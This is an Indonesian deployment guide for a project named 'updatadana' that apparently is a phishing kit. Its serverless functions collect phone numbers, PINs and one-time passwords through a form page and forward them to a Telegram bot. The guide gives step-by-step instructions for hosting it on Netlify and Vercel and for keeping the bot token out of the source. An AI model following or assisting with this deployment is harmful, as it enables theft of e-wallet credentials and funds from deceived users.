# Panduan Deployment di Netlify dan Vercel

## Perubahan yang Dilakukan

1. Migrasi backend PHP ke serverless functions JavaScript/Node.js
2. Pengamanan API key Telegram menggunakan environment variables
3. Penyesuaian frontend untuk berkomunikasi dengan serverless functions
4. Konfigurasi untuk deployment di Netlify dan Vercel
5. Perbaikan referensi CSS agar tampilan tetap utuh

## Cara Deployment di Netlify

### Langkah 1: Persiapan Akun Netlify
1. Buat akun di [Netlify](https://www.netlify.com/) jika belum memilikinya
2. Login ke dashboard Netlify

### Langkah 2: Deploy Website
1. Klik tombol "Add new site" > "Import an existing project"
2. Hubungkan dengan repository Git (GitHub, GitLab, atau Bitbucket) atau upload folder `updatadana-netlify` secara langsung
3. Jika menggunakan Git, pilih repository dan branch yang sesuai
4. Netlify akan otomatis mendeteksi konfigurasi dari file `netlify.toml`

### Langkah 3: Konfigurasi Environment Variables
1. Setelah website di-deploy, buka tab "Site settings"
2. Pilih "Environment variables"
3. Tambahkan dua environment variables berikut:
   - `TELEGRAM_BOT_TOKEN`: Masukkan token bot Telegram Anda
   - `TELEGRAM_CHAT_ID`: Masukkan ID chat Telegram Anda

### Langkah 4: Deploy Ulang
1. Setelah menambahkan environment variables, kembali ke tab "Deploys"
2. Klik tombol "Trigger deploy" > "Deploy site"
3. Tunggu proses deployment selesai

## Cara Deployment di Vercel

### Langkah 1: Persiapan Akun Vercel
1. Buat akun di [Vercel](https://vercel.com/) jika belum memilikinya
2. Login ke dashboard Vercel

### Langkah 2: Deploy Website
1. Klik tombol "Add New" > "Project"
2. Hubungkan dengan repository Git atau upload folder `updatadana-netlify` secara langsung
3. Jika menggunakan Git, pilih repository dan branch yang sesuai
4. Vercel akan otomatis mendeteksi konfigurasi dari file `vercel.json`

### Langkah 3: Konfigurasi Environment Variables
1. Pada halaman konfigurasi project, buka tab "Environment Variables"
2. Tambahkan dua environment variables berikut:
   - `TELEGRAM_BOT_TOKEN`: Masukkan token bot Telegram Anda
   - `TELEGRAM_CHAT_ID`: Masukkan ID chat Telegram Anda
3. Klik "Deploy" untuk melanjutkan deployment

## Struktur Folder

```
updatadana-netlify/
├── api/                # Serverless functions untuk Vercel
│   ├── hp.js           # Fungsi untuk menerima nomor HP
│   ├── pin.js          # Fungsi untuk menerima PIN
│   └── otp.js          # Fungsi untuk menerima OTP
├── functions/          # Serverless functions untuk Netlify
│   ├── hp.js           # Fungsi untuk menerima nomor HP
│   ├── pin.js          # Fungsi untuk menerima PIN
│   └── otp.js          # Fungsi untuk menerima OTP
├── public/             # File statis (frontend)
│   ├── ast/            # Asset (CSS, JS, gambar)
│   ├── index.html      # Halaman utama
│   └── one.html        # Halaman form
├── netlify.toml        # Konfigurasi Netlify
├── vercel.json         # Konfigurasi Vercel
└── package.json        # Dependensi Node.js
```

## Keamanan API Bot Telegram

Dengan perubahan ini, API key bot Telegram tidak lagi di-hardcode dalam kode, melainkan disimpan sebagai environment variables di Netlify/Vercel. Ini meningkatkan keamanan karena:

1. API key tidak terekspos di kode sumber
2. API key tidak dapat diakses oleh pengunjung website
3. API key dapat diubah tanpa perlu mengubah kode

## Catatan Penting

- Pastikan environment variables sudah dikonfigurasi sebelum website digunakan
- Jangan pernah menyimpan API key di file yang dapat diakses publik
- Jika perlu mengubah API key, cukup update environment variables di dashboard Netlify/Vercel
- Semua file CSS asli tetap dipertahankan untuk memastikan tampilan tetap utuh
